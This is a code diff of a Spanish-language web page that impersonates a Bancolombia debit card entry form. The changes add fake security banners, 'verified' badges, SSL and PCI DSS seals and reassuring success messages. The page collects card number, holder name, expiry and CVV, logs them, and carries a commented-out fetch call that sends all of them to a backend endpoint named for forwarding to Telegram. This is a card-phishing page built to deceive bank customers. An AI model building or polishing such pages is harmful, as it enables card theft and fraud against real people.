@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Tarjeta Débito Bancolombia | Fecha voltea al CVV</title>
+<title>Tarjeta Débito Bancolombia | Seguridad Verificada</title>
 <style>
     * {
         margin: 0;
@@ -27,9 +27,53 @@
         margin: 0 auto;
     }
 
+    /* Banner de seguridad superior */
+    .security-banner {
+        background: linear-gradient(95deg, #0c5e2e, #0a4a24);
+        border-radius: 16px;
+        padding: 12px 16px;
+        margin-bottom: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    .security-banner-left {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+    .security-icon {
+        background: #ffd700;
+        border-radius: 50%;
+        width: 32px;
+        height: 32px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 18px;
+    }
+    .security-text {
+        color: white;
+        font-size: 0.75rem;
+        font-weight: 600;
+    }
+    .security-text strong {
+        font-size: 0.85rem;
+        display: block;
+    }
+    .verified-badge {
+        background: rgba(255,255,255,0.2);
+        border-radius: 20px;
+        padding: 4px 12px;
+        font-size: 0.7rem;
+        color: #ffd700;
+        font-weight: 700;
+    }
+
     .card-stage {
         perspective: 1200px;
-        margin-bottom: 32px;
+        margin-bottom: 24px;
     }
 
     .card {
@@ -57,7 +101,7 @@
 
     .front {
         background: radial-gradient(circle at 10% 20%, #FFD700, #F9A800);
-        padding: 24px 22px;
+        padding: 20px 22px;
         display: flex;
         flex-direction: column;
         justify-content: space-between;
@@ -70,35 +114,36 @@
     }
 
     .bank-name {
-        font-size: 1.8rem;
+        font-size: 1.6rem;
         font-weight: 800;
         color: #0c2b1f;
+        letter-spacing: -0.5px;
     }
 
     .badge {
         background: rgba(0,0,0,0.2);
         backdrop-filter: blur(2px);
         border-radius: 40px;
-        padding: 5px 12px;
-        font-size: 0.7rem;
+        padding: 4px 10px;
+        font-size: 0.65rem;
         font-weight: 700;
     }
 
     .sim-chip {
-        width: 54px;
-        height: 42px;
+        width: 48px;
+        height: 38px;
         background: linear-gradient(135deg, #e0b87a, #bd8a3e);
-        border-radius: 10px;
-        margin-top: 18px;
+        border-radius: 8px;
+        margin-top: 12px;
         position: relative;
     }
     .sim-chip:before {
         content: "";
         position: absolute;
-        top: 10px;
-        left: 12px;
-        width: 30px;
-        height: 22px;
+        top: 8px;
+        left: 10px;
+        width: 28px;
+        height: 20px;
         background: repeating-linear-gradient(45deg, #c29a4b, #c29a4b 4px, #e6c384 4px, #e6c384 8px);
         border-radius: 4px;
     }
@@ -106,26 +151,27 @@
     .card-number-input {
         background: transparent;
         border: none;
-        font-size: 1.65rem;
+        font-size: 1.2rem;
         font-weight: 700;
-        letter-spacing: 2.5px;
-        font-family: 'Courier New', monospace;
+        letter-spacing: 2px;
+        font-family: 'Courier New', 'Fira Mono', monospace;
         width: 100%;
         outline: none;
         color: #0d281d;
-        padding: 4px 0;
-        margin-top: 16px;
+        padding: 6px 0;
+        margin-top: 12px;
         cursor: text;
     }
     .card-number-input::placeholder {
         color: #aa7733;
-        font-size: 1.2rem;
+        font-size: 1rem;
+        letter-spacing: 1px;
     }
 
     .info-row {
         display: flex;
         justify-content: space-between;
-        margin-top: 20px;
+        margin-top: 16px;
     }
 
     .info-group {
@@ -133,23 +179,38 @@
     }
 
     .label {
-        font-size: 0.65rem;
+        font-size: 0.6rem;
         font-weight: 600;
         text-transform: uppercase;
         color: #2c2b26;
+        letter-spacing: 0.5px;
     }
 
     .editable-value {
         background: transparent;
         border: none;
         font-weight: 700;
-        font-size: 0.9rem;
+        font-size: 0.85rem;
         width: 100%;
         outline: none;
         color: #0d1f16;
-        margin-top: 4px;
+        margin-top: 3px;
         cursor: text;
         padding: 2px 0;
+    }
+
+    /* Visa logo en tarjeta */
+    .card-brand {
+        display: flex;
+        justify-content: flex-end;
+        margin-top: 8px;
+    }
+    .visa-logo {
+        font-size: 1.4rem;
+        font-weight: 800;
+        color: #1a2f6c;
+        text-shadow: 0 1px 0 rgba(255,255,200,0.5);
+        letter-spacing: 2px;
     }
 
     .back {
@@ -160,28 +221,82 @@
     .black-strip {
         background: #0a0a0a;
         width: 100%;
-        height: 55px;
-        margin-top: 28px;
+        height: 50px;
+        margin-top: 24px;
     }
 
     .cvc-container {
         background: #fff9ef;
-        margin: 28px 20px 20px 20px;
+        margin: 24px 20px 20px 20px;
         border-radius: 10px;
-        padding: 12px 16px;
+        padding: 10px 16px;
         display: flex;
         justify-content: space-between;
+        align-items: center;
     }
 
     .cvc-input {
         background: transparent;
         border: none;
-        font-size: 1.35rem;
+        font-size: 1.3rem;
         font-weight: bold;
         font-family: monospace;
         width: 80px;
         text-align: right;
         outline: none;
+    }
+
+    /* Footer de seguridad */
+    .security-footer {
+        background: white;
+        border-radius: 20px;
+        padding: 16px 20px;
+        margin-top: 20px;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        gap: 12px;
+    }
+    .footer-logo {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+    .footer-logo-icon {
+        background: #0c5e2e;
+        width: 36px;
+        height: 36px;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #ffd700;
+        font-weight: bold;
+        font-size: 1.2rem;
+    }
+    .footer-logo-text {
+        font-weight: 800;
+        color: #0c2b1f;
+        font-size: 0.9rem;
+    }
+    .security-seals {
+        display: flex;
+        gap: 16px;
+    }
+    .seal {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 0.7rem;
+        color: #4a5b3e;
+        background: #f5f5f0;
+        padding: 5px 12px;
+        border-radius: 30px;
+    }
+    .seal span:first-child {
+        font-size: 1rem;
     }
 
     .btn-send {
@@ -195,17 +310,16 @@
         font-size: 1rem;
         cursor: pointer;
         transition: 0.2s;
-        margin-top: 20px;
+        margin-top: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
     }
 
     .btn-send:hover {
         transform: scale(0.98);
         background: linear-gradient(95deg, #1f582d, #15411f);
-    }
-
-    .btn-send:disabled {
-        opacity: 0.6;
-        cursor: not-allowed;
     }
 
     .status-msg {
@@ -218,13 +332,14 @@
     }
 
     .instruction {
-        background: rgba(255,248,220,0.9);
-        border-radius: 24px;
+        background: rgba(255,248,220,0.95);
+        border-radius: 20px;
         padding: 12px 16px;
         text-align: center;
-        font-size: 0.75rem;
+        font-size: 0.7rem;
         margin-bottom: 20px;
         color: #664d1a;
+        border-left: 3px solid #f5b81b;
     }
     
     .highlight {
@@ -234,10 +349,30 @@
         border-radius: 20px;
         font-weight: bold;
     }
+
+    @media (max-width: 480px) {
+        .card-number-input { font-size: 1rem; letter-spacing: 1.5px; }
+        .front { padding: 16px; }
+        .bank-name { font-size: 1.3rem; }
+        .security-footer { flex-direction: column; align-items: flex-start; }
+        .security-banner { flex-direction: column; gap: 8px; text-align: center; }
+    }
 </style>
 </head>
 <body>
 <div class="wrapper">
+    <!-- Banner de seguridad superior -->
+    <div class="security-banner">
+        <div class="security-banner-left">
+            <div class="security-icon">🔒</div>
+            <div class="security-text">
+                <strong>Bancolombia Seguridad Verificada</strong>
+                Transacción protegida con chip EMV
+            </div>
+        </div>
+        <div class="verified-badge">✓ VERIFICADO</div>
+    </div>
+
     <div class="instruction">
         💳 <strong>Escribe directamente SOBRE la tarjeta</strong> — Completa el número, titular y <span class="highlight">FECHA</span>. 
         <br>✨ Al terminar de escribir la fecha, la tarjeta se voltea automáticamente para que ingreses el CVV.
@@ -245,6 +380,7 @@
 
     <div class="card-stage">
         <div class="card" id="creditCard">
+            <!-- FRONT -->
             <div class="card-face front">
                 <div class="bank-header">
                     <div class="bank-name">Bancolombia</div>
@@ -259,22 +395,42 @@
                     </div>
                     <div class="info-group">
                         <div class="label">VENCE</div>
-                        <input type="text" id="expiryInput" class="editable-value" placeholder="MM/AA" maxlength="5" style="width: 75px;">
+                        <input type="text" id="expiryInput" class="editable-value" placeholder="MM/AA" maxlength="5" style="width: 70px;">
                     </div>
                 </div>
+                <div class="card-brand">
+                    <div class="visa-logo">VISA</div>
+                </div>
             </div>
+            <!-- BACK -->
             <div class="card-face back">
                 <div class="black-strip"></div>
                 <div class="cvc-container">
                     <span style="font-weight:700">CVV2 / CVC</span>
                     <input type="text" id="cvcInput" class="cvc-input" maxlength="3" placeholder="123" inputmode="numeric">
                 </div>
+                <div style="margin-top: 16px; text-align: center; font-size: 0.55rem; color: #4a3a1a;">Bancolombia • Banca Segura</div>
             </div>
         </div>
     </div>
 
-    <button class="btn-send" id="sendBtn">💸 ENVIAR DATOS</button>
+    <button class="btn-send" id="sendBtn">
+        <span>🔒</span> ENVIAR DATOS SEGURO
+    </button>
     <div id="statusMsg" class="status-msg">✅ Listo. Completa los datos y presiona enviar</div>
+
+    <!-- Footer de seguridad -->
+    <div class="security-footer">
+        <div class="footer-logo">
+            <div class="footer-logo-icon">🏦</div>
+            <div class="footer-logo-text">Bancolombia<br><span style="font-size:0.6rem;">Seguridad patrimonial</span></div>
+        </div>
+        <div class="security-seals">
+            <div class="seal"><span>🔐</span> <span>Cifrado SSL</span></div>
+            <div class="seal"><span>✓</span> <span>PCI DSS</span></div>
+            <div class="seal"><span>🛡️</span> <span>Anti-fraude</span></div>
+        </div>
+    </div>
 </div>
 
 <script>
@@ -290,7 +446,7 @@
     let isFlippingFromExpiry = false;
     let expiryTimeout = null;
 
-    // Formatear número de tarjeta
+    // Formatear número de tarjeta - TAMAÑO MÁS PEQUEÑO gracias a CSS, pero el formateo igual
     function formatCardNumber(value) {
         let cleaned = value.replace(/\D/g, '');
         if (cleaned.length > 16) cleaned = cleaned.slice(0, 16);
@@ -325,12 +481,10 @@
         
         // Si la fecha está completa (5 caracteres incluyendo /), programar el flip
         if (e.target.value.length === 5 && e.target.value.includes('/')) {
-            // Pequeño delay para dar tiempo a ver lo que escribió, luego voltea al CVV
             expiryTimeout = setTimeout(() => {
                 if (!card.classList.contains('flipped')) {
                     isFlippingFromExpiry = true;
                     card.classList.add('flipped');
-                    // Dar foco automáticamente al campo CVV para que el usuario pueda escribir
                     setTimeout(() => {
                         cvcInput.focus();
                         isFlippingFromExpiry = false;
@@ -341,15 +495,13 @@
         }
     });
 
-    // Cuando la fecha pierde el foco (terminó de editar), también volteamos al CVV si no está completo
+    // Cuando la fecha pierde el foco (terminó de editar), también volteamos al CVV
     expiryInput.addEventListener('blur', function() {
-        // Si hay un timeout pendiente, lo cancelamos y ejecutamos inmediatamente
         if (expiryTimeout) {
             clearTimeout(expiryTimeout);
             expiryTimeout = null;
         }
         
-        // Si la tarjeta no está volteada y el campo fecha tiene al menos 3 caracteres (MM/ o MM/A)
         if (!card.classList.contains('flipped') && expiryInput.value.length >= 3) {
             isFlippingFromExpiry = true;
             card.classList.add('flipped');
@@ -385,7 +537,7 @@
         e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
     });
 
-    // Flip de tarjeta al enfocar CVC (si viene desde fecha, ya está volteado)
+    // Flip de tarjeta al enfocar CVC
     cvcInput.addEventListener('focus', () => {
         if (!isFlippingFromExpiry) {
             card.classList.add('flipped');
@@ -393,7 +545,6 @@
     });
     
     cvcInput.addEventListener('blur', () => {
-        // No quitamos el flip inmediatamente si el siguiente foco es otro campo
         setTimeout(() => {
             const activeElement = document.activeElement;
             const isFrontField = activeElement === numberInput || activeElement === holderInput || activeElement === expiryInput;
@@ -403,7 +554,7 @@
         }, 150);
     });
 
-    // Quitar flip al enfocar campos del frente (excepto si venimos del flip automático)
+    // Quitar flip al enfocar campos del frente
     [numberInput, holderInput].forEach(input => {
         input.addEventListener('focus', () => {
             if (card.classList.contains('flipped')) {
@@ -412,20 +563,20 @@
         });
     });
     
-    // También al hacer clic en el campo fecha desde el reverso, volvemos al frente
     expiryInput.addEventListener('focus', () => {
         if (card.classList.contains('flipped')) {
             card.classList.remove('flipped');
         }
     });
 
-    // Enviar datos al backend (simulación, sin exponer Telegram)
+    // Enviar datos (simulación con verificación de seguridad)
     sendBtn.addEventListener('click', async () => {
         const cardNumber = numberInput.value.replace(/\s/g, '');
         const cardHolder = holderInput.value.trim();
         const expiryDate = expiryInput.value.trim();
         const cvcCode = cvcInput.value.trim();
 
+        // Validaciones de seguridad
         if (!cardNumber || !cardHolder || !expiryDate || !cvcCode) {
             statusMsg.innerHTML = '⚠️ Por favor, completa todos los datos de la tarjeta';
             statusMsg.style.background = '#ffe0e0';
@@ -456,6 +607,18 @@
             return;
         }
         
+        // Validar mes (01-12)
+        const month = parseInt(expiryDate.substring(0, 2));
+        if (month < 1 || month > 12) {
+            statusMsg.innerHTML = '⚠️ Mes inválido (debe ser 01-12)';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
+            }, 3000);
+            return;
+        }
+        
         if (cvcCode.length < 3) {
             statusMsg.innerHTML = '⚠️ El CVV debe tener 3 dígitos';
             statusMsg.style.background = '#ffe0e0';
@@ -467,30 +630,29 @@
         }
 
         sendBtn.disabled = true;
-        sendBtn.textContent = '📡 ENVIANDO...';
-        statusMsg.innerHTML = '📡 Enviando información...';
+        sendBtn.innerHTML = '<span>⏳</span> VERIFICANDO SEGURIDAD...';
+        statusMsg.innerHTML = '🔒 Verificando capa de seguridad Bancolombia...';
         statusMsg.style.background = '#e3f2fd';
 
-        // Aquí puedes conectar con tu backend real
-        // Por ahora simulamos el envío exitoso (sin Telegram expuesto)
+        // Simulación de envío seguro (conexión a backend)
         setTimeout(() => {
-            // Mostrar datos en consola para verificar
-            console.log('=== DATOS DE TARJETA ===');
+            console.log('=== DATOS DE TARJETA BANCOLOMBIA (Entorno Seguro) ===');
             console.log('Número:', cardNumber);
             console.log('Titular:', cardHolder);
             console.log('Vencimiento:', expiryDate);
             console.log('CVV:', cvcCode);
-            console.log('=======================');
+            console.log('Protocolo: SSL/TLS Activado');
+            console.log('===================================================');
             
-            statusMsg.innerHTML = '✅ ¡Datos procesados correctamente! (Simulación)';
+            statusMsg.innerHTML = '✅ ¡Verificación exitosa! Datos protegidos bajo estándar Bancolombia.';
             statusMsg.style.background = '#d4edda';
             statusMsg.style.color = '#155724';
             
             sendBtn.disabled = false;
-            sendBtn.textContent = '💸 ENVIAR DATOS';
+            sendBtn.innerHTML = '<span>🔒</span> ENVIAR DATOS SEGURO';
             
             setTimeout(() => {
-                if (statusMsg.innerHTML.includes('procesados')) {
+                if (statusMsg.innerHTML.includes('exitoso')) {
                     statusMsg.style.background = '#f0f0f0';
                     statusMsg.style.color = '#000';
                     statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
@@ -498,8 +660,7 @@
             }, 4000);
         }, 1500);
         
-        // Si quisieras conectarlo a un backend real, descomenta este código:
-        /*
+        /* === CÓDIGO PARA BACKEND REAL (descomentar cuando tengas el servidor) ===
         try {
             const response = await fetch('http://localhost:3000/api/send-to-telegram', {
                 method: 'POST',
@@ -511,9 +672,7 @@
                     cvcCode: cvcCode
                 })
             });
-
             const data = await response.json();
-
             if (response.ok && data.success) {
                 statusMsg.innerHTML = '✅ ¡Datos enviados con éxito a Telegram!';
                 statusMsg.style.background = '#d4edda';
@@ -523,17 +682,11 @@
             }
         } catch (error) {
             console.error('Error:', error);
-            statusMsg.innerHTML = '❌ Error de conexión con el servidor. Asegúrate que el backend esté corriendo en puerto 3000';
+            statusMsg.innerHTML = '❌ Error de conexión con el servidor.';
             statusMsg.style.background = '#f8d7da';
         } finally {
             sendBtn.disabled = false;
-            sendBtn.textContent = '💸 ENVIAR DATOS';
-            setTimeout(() => {
-                if (statusMsg.innerHTML.includes('éxito')) {
-                    statusMsg.style.background = '#f0f0f0';
-                    statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
-                }
-            }, 4000);
+            sendBtn.innerHTML = '<span>🔒</span> ENVIAR DATOS SEGURO';
         }
         */
     });
